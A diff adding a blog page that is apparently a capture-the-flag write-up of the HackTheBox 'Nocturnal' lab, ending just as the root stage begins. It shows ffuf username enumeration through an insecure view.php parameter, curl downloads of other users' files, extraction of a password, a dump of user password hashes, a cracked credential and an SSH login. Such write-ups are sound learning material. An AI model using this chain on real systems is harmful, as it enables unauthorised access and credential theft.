@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/04/15/hackthebox/htb-nocturnal/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Nocturnal | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Nocturnal</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-04-15 22:03:29</span>
+        <span class="mobile">2025-04-15 22:03:29</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:10:41</span>
+            <span class="mobile">2025-08-17 13:10:41</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Easy/">Easy</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>nmap</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>fuzz for directories and subdomains</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Directories</span></span><br><span class="line">backups                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 17ms]</span><br><span class="line">uploads_event           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 24ms]</span><br><span class="line">uploads_video           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 23ms]</span><br><span class="line">uploads_user            [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 23ms]</span><br><span class="line">uploads                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 24ms]</span><br><span class="line">uploads_admin           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 23ms]</span><br><span class="line">uploads2                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 23ms]</span><br><span class="line">uploads_forum           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 26ms]</span><br><span class="line">uploads_group           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 27ms]</span><br><span class="line"></span><br><span class="line"><span class="comment">#subdomains</span></span><br><span class="line">[none]</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80"></a>Port 80</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413141818.png"
+                      width="500"
+                >
+
+
+<ul>
+<li>allows login and registering</li>
+<li>at the end of page, contains the email for support (<a class="link"   href="mailto:&#115;&#117;&#112;&#112;&#111;&#114;&#x74;&#64;&#x6e;&#x6f;&#99;&#x74;&#117;&#114;&#x6e;&#97;&#x6c;&#x2e;&#104;&#x74;&#98;" >&#115;&#117;&#112;&#112;&#111;&#114;&#x74;&#64;&#x6e;&#x6f;&#99;&#x74;&#117;&#114;&#x6e;&#97;&#x6c;&#x2e;&#104;&#x74;&#98;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</li>
+</ul>
+<p>Register account as muyi:muyi and logins with it</p>
+<ul>
+<li>redirects to an upload page</li>
+</ul>
+<p>Tried to upload <em>web.php</em> to exploit the file upload vulnerabilties. But the website return the following error:</p>
+<ul>
+<li><code>Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.</code></li>
+</ul>
+<p>After uploading a <code>test.pdf</code>, notice that it exists in the record<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413143939.png"
+                      width="500"
+                ></p>
+<p>In burpsuite, notice that<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413144023.png"
+                      width="500"
+                ></p>
+<ul>
+<li>the website queries using <code>username + file</code> to read the file via <code>view.php</code></li>
+<li>using PHPSESSID to authenticate user</li>
+</ul>
+<h3 id="Fuzzing-more-usernames"><a href="#Fuzzing-more-usernames" class="headerlink" title="Fuzzing more usernames"></a>Fuzzing more usernames</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ curl -i http://nocturnal.htb/login.php --data <span class="string">&quot;username=muyi&amp;password=muyi&quot;</span></span><br><span class="line">[...]</span><br><span class="line">Set-Cookie: PHPSESSID=34k91rcaeqhpn70hvkqg07diss; path=/</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>with the session cookie</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ curl -i http://nocturnal.htb/dashboard.php -H <span class="string">&quot;Cookie: PHPSESSID=34k91rcaeqhpn70hvkqg07diss&quot;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">[...]</span><br><span class="line">[content of dashboard.php]</span><br></pre></td></tr></table></figure></div>
+
+<p>Therefore, using <code>ffuf</code> and <code>xato-username.txt</code> from <code>seclists</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ ffuf -u <span class="string">&quot;http://nocturnal.htb/view.php?username=FUZZ&amp;file=idk.pdf&quot;</span> -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -H <span class="string">&quot;Cookie: PHPSESSID=34k91rcaeqhpn70hvkqg07diss&quot;</span></span><br><span class="line">[...]</span><br><span class="line">pussy                   [Status: 200, Size: 2985, Words: 1170, Lines: 129, Duration: 25ms]</span><br><span class="line">qwerty                  [Status: 200, Size: 2985, Words: 1170, Lines: 129, Duration: 25ms]</span><br><span class="line">patrick                 [Status: 200, Size: 2985, Words: 1170, Lines: 129, Duration: 25ms]</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>from the fuzz above, understand that every response with word count 1170 must be filter</li>
+</ul>
+<p>Therefore,</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://nocturnal.htb/view.php?username=FUZZ&amp;file=idk.pdf&quot;</span> -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -H <span class="string">&quot;Cookie: PHPSESSID=34k91rcaeqhpn70hvkqg07diss&quot;</span> -fw 1170</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 42ms]</span><br><span class="line">amanda                  [Status: 200, Size: 3341, Words: 1178, Lines: 129, Duration: 28ms]</span><br><span class="line">tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 20ms]</span><br></pre></td></tr></table></figure></div>
+
+<p>From there, craft the curl payload to see if there’s any file to be downloaded</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#using this payload</span></span><br><span class="line">$ curl <span class="string">&quot;http://nocturnal.htb/view.php?username=admin&amp;file=idk.pdf&quot;</span> -H <span class="string">&quot;Cookie: PHPSESSID=34k91rcaeqhpn70hvkqg07diss&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#at the bottom of the source code</span></span><br><span class="line"><span class="comment">#admin</span></span><br><span class="line">&lt;div class=<span class="string">&#x27;error&#x27;</span>&gt;File does not exist.&lt;/div&gt;&lt;h2&gt;Available files <span class="keyword">for</span> download:&lt;/h2&gt;&lt;ul&gt;&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#amanda</span></span><br><span class="line">&lt;div class=<span class="string">&#x27;error&#x27;</span>&gt;File does not exist.&lt;/div&gt;&lt;h2&gt;Available files <span class="keyword">for</span> download:&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=<span class="string">&quot;view.php?username=amanda&amp;file=privacy.odt&quot;</span>&gt;privacy.odt&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#tobias</span></span><br><span class="line">&lt;div class=<span class="string">&#x27;error&#x27;</span>&gt;File does not exist.&lt;/div&gt;&lt;h2&gt;Available files <span class="keyword">for</span> download:&lt;/h2&gt;&lt;ul&gt;&lt;/ul&gt;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>it is clear that user <code>amanda</code> has upload a file named <code>privacy.odt</code></li>
+</ul>
+<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><p>download the file and view it<br><code>$ curl &quot;http://nocturnal.htb/view.php?username=amanda&amp;file=privacy.odt&quot; -H &quot;Cookie: PHPSESSID=34k91rcaeqhpn70hvkqg07diss&quot; --output privacy.odt</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ file privacy.odt</span><br><span class="line">privacy.odt: Zip archive, with extra data prepended</span><br><span class="line"></span><br><span class="line"><span class="comment">#unzip it and read content.xml using xmllint, discover a temp password for amanda</span></span><br><span class="line">arHkG7HAI68X8s1J</span><br></pre></td></tr></table></figure></div>
+
+<p>using the password, amanda:arHkG7HAI68X8s1J. Logged into the website again and notice that user <code>amanda</code> has admin privilege.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413145238.png"
+                      width="250"
+                ></p>
+<p>Inside the admin panel, we can view all the php files available.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413145322.png"
+                      width="500"
+                ></p>
+<p>At the end of the page, notice there’s a backup function, using the password discovered for user <code>amanda</code>, backup the entire php files<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413145825.png"
+                      width="500"
+                ></p>
+<ul>
+<li>discover <code>nocturnal_database.db</code></li>
+<li>download the zip file</li>
+</ul>
+<p>Unzipping the zip file</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -P arHkG7HAI68X8s1J backup_2025-04-13.zip</span><br><span class="line">Archive:  backup_2025-04-13.zip</span><br><span class="line">  inflating: admin.php</span><br><span class="line">   creating: uploads/</span><br><span class="line">   skipping: uploads/aaaaabbb.docx   incorrect password</span><br><span class="line">   skipping: uploads/test.pdf        incorrect password</span><br><span class="line">  inflating: uploads/privacy.odt</span><br><span class="line">   skipping: uploads/aaaaabbb.doc    incorrect password</span><br><span class="line">   skipping: uploads/accounts.xlsx   incorrect password</span><br><span class="line">   skipping: uploads/h1&gt;aa.pdf       incorrect password</span><br><span class="line">   skipping: uploads/laughterinsider.pdf  incorrect password</span><br><span class="line">  inflating: register.php</span><br><span class="line">  inflating: login.php</span><br><span class="line">  inflating: dashboard.php</span><br><span class="line">  inflating: nocturnal_database.db</span><br><span class="line">  inflating: index.php</span><br><span class="line">  inflating: view.php</span><br><span class="line">  inflating: logout.php</span><br><span class="line">  inflating: style.css</span><br><span class="line"> extracting: uploads/rce.php.pdf</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>the file <code>nocturnal_database.db</code> is an SQLite3 file</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sqlite3 nocturnal_database.db</span><br><span class="line">SQLite version 3.46.1 2024-08-13 09:16:08</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">uploads  <span class="built_in">users</span></span><br><span class="line">sqlite&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">1|admin|d725aeba143f575736b07e045d8ceebb</span><br><span class="line">2|amanda|df8b20aa0c935023f99ea58358fb63c4</span><br><span class="line">4|tobias|55c82b1ccd55ab219b3b109b07d5061d</span><br><span class="line">6|mtin|6b0714a535fcb81d55aee1f0984a1001</span><br><span class="line">7|muyi|a433c3b46c279c1b189ae164e78ff7d0</span><br><span class="line">8|<span class="built_in">test</span>|cc03e747a6afbbcbf8be7668acfebee5</span><br><span class="line">9|anewuser|291b16b76dd563c15ffe173d7c7976a4</span><br><span class="line">10|NewUser|ccb4de1ed138347d2c8107214dc09b52</span><br></pre></td></tr></table></figure></div>
+
+<p>Cracking the password and returns<br><code>tobias:slowmotionapocalypse</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ssh tobias@<span class="variable">$ip</span></span><br><span class="line">tobias@10.10.11.64<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">tobias@nocturnal:~$ whoami</span></span><br><span class="line"><span class="string">tobias</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>some enumeration leads to hidden hosted service on localhost port 8080</p>
